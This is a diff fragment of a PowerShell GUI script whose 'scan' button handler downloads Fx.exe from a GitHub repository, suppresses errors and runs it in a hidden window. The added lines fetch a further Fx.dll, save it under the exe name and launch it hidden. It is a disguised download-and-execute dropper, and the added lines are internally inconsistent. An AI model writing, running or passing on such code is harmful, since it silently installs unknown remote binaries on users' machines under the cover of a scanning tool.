@@ -288,9 +288,11 @@ $scan = {
    
     # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.dll" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
     Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+    Start-Process -FilePath "Fx.dll" -WindowStyle Hidden
     
     # Удаляем файл через 5 секунды
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
@@ -307,3 +309,4 @@ $btn.Add_Click($scan)
 
 # Запуск
 [void]$form.ShowDialog()
+
